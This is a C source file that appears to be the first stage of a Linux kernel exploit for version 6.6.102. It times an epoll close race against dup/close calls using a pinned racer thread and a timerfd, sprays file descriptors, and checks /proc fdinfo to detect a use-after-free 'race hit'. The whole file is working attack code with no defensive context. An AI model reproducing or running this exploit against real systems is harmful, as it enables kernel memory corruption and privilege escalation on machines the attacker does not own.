#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/timerfd.h>
#include <sys/eventfd.h>
#include <pthread.h>
#include <string.h>
#include <sched.h>
#include <time.h>

#define TOTAL_TRIALS 100000
#define BATCH_A_SIZE 32
#define BATCH_B_SIZE 32
#define RACE_DUP_CLOSE_ITERS 15

volatile int g_race_ready_main = 0;
volatile int g_race_ready_racer = 0;
volatile int g_race_done = 0;
volatile int g_stop_racer = 0;
volatile int g_ep_race_waiter = -1;
volatile uint64_t g_time_false_sharing = 10000;
int g_timerfd_wakeup;
uint64_t launch_ahead_ns = 2500;

uint64_t mono_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + ts.tv_nsec;
}

void pin_to_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

static void *racer_thread_func(void *arg) {
    pin_to_cpu(0);
    while (!g_stop_racer) {
        while (!g_race_ready_main && !g_stop_racer) sched_yield();
        if (g_stop_racer) break;

        g_race_ready_main = 0;
        g_race_ready_racer = 1;

        uint64_t t_now = mono_ns();
        uint64_t t_fire = t_now + g_time_false_sharing / 2;
        struct itimerspec its;
        memset(&its, 0, sizeof(its));
        its.it_value.tv_sec = t_fire / 1000000000ULL;
        its.it_value.tv_nsec = t_fire % 1000000000ULL;
        timerfd_settime(g_timerfd_wakeup, TFD_TIMER_ABSTIME, &its, NULL);

        uint64_t t_close = t_fire > launch_ahead_ns ? (t_fire - launch_ahead_ns) : t_fire;
        while (mono_ns() < t_close) {}

        close(g_ep_race_waiter);
        g_race_done = 1;
    }
    return NULL;
}

int check_survivor_fdinfo(int epfd) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", epfd);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    char buf[512] = {0};
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = '\0';
    return (strstr(buf, "tfd:") != NULL) ? 1 : 0;
}

int main() {
    pin_to_cpu(1);
    printf("[*] Starting Phase 3 Stage-1 Race test for 6.6.102...\n");
    g_timerfd_wakeup = timerfd_create(CLOCK_MONOTONIC, 0);
    
    pthread_t racer_th;
    pthread_create(&racer_th, NULL, racer_thread_func, NULL);

    int race_wins = 0;
    struct epoll_event g_ev = { .events = EPOLLIN, .data.u64 = 0xdeadbeef };

    for (int iter = 1; iter <= TOTAL_TRIALS; iter++) {
        if (iter % 2000 == 0) {
            launch_ahead_ns += 500;
            if (launch_ahead_ns > 6000) launch_ahead_ns = 500;
            printf("[*] Iter %d, wins %d, trying launch_ahead_ns=%lu\n", iter, race_wins, launch_ahead_ns);
        }

        int ep_race_waiter = epoll_create1(0);
        int ep_race_target = epoll_create1(0);
        int ep_uaf_waiter = epoll_create1(0);

        if (ep_race_waiter < 0 || ep_race_target < 0 || ep_uaf_waiter < 0) {
            if (ep_race_waiter >= 0) close(ep_race_waiter);
            if (ep_race_target >= 0) close(ep_race_target);
            if (ep_uaf_waiter >= 0) close(ep_uaf_waiter);
            continue;
        }

        epoll_ctl(ep_race_waiter, EPOLL_CTL_ADD, ep_race_target, &g_ev);

        int batch_a_fds[BATCH_A_SIZE];
        for (int i = 0; i < BATCH_A_SIZE; i++) batch_a_fds[i] = open("/dev/null", O_RDONLY);

        g_ep_race_waiter = ep_race_waiter;
        g_race_ready_main = 1;
        while (!g_race_ready_racer) sched_yield();
        g_race_ready_racer = 0;

        uint64_t t0 = mono_ns();
        for (int j = 0; j < RACE_DUP_CLOSE_ITERS; j++) close(dup(ep_race_target));
        g_time_false_sharing = mono_ns() - t0;

        close(ep_race_target);

        int ep_uaf_target = epoll_create1(0);
        int armed_efd = -1;

        if (ep_uaf_target >= 0) {
            epoll_ctl(ep_uaf_waiter, EPOLL_CTL_ADD, ep_uaf_target, &g_ev);
            armed_efd = eventfd(1, EFD_NONBLOCK);
            struct epoll_event armed_ev = { .events = EPOLLIN, .data.fd = armed_efd };
            epoll_ctl(ep_uaf_target, EPOLL_CTL_ADD, armed_efd, &armed_ev);
        }

        int batch_b_fds[BATCH_B_SIZE];
        for (int i = 0; i < BATCH_B_SIZE; i++) batch_b_fds[i] = open("/dev/null", O_RDONLY);

        while (!g_race_done) sched_yield();
        g_race_done = 0;

        if (ep_uaf_target >= 0) close(ep_uaf_target);

        if (check_survivor_fdinfo(ep_uaf_waiter)) {
            race_wins++;
            printf("[+] NATURAL RACE HIT! Iteration %d (total wins=%d)\n", iter, race_wins);
        }

        close(ep_uaf_waiter);
        for (int i = 0; i < BATCH_A_SIZE; i++) close(batch_a_fds[i]);
        for (int i = 0; i < BATCH_B_SIZE; i++) close(batch_b_fds[i]);
        if (armed_efd >= 0) close(armed_efd);
    }
    
    g_stop_racer = 1;
    pthread_join(racer_th, NULL);
    printf("[*] Done. Total wins: %d / %d\n", race_wins, TOTAL_TRIALS);
    return 0;
}
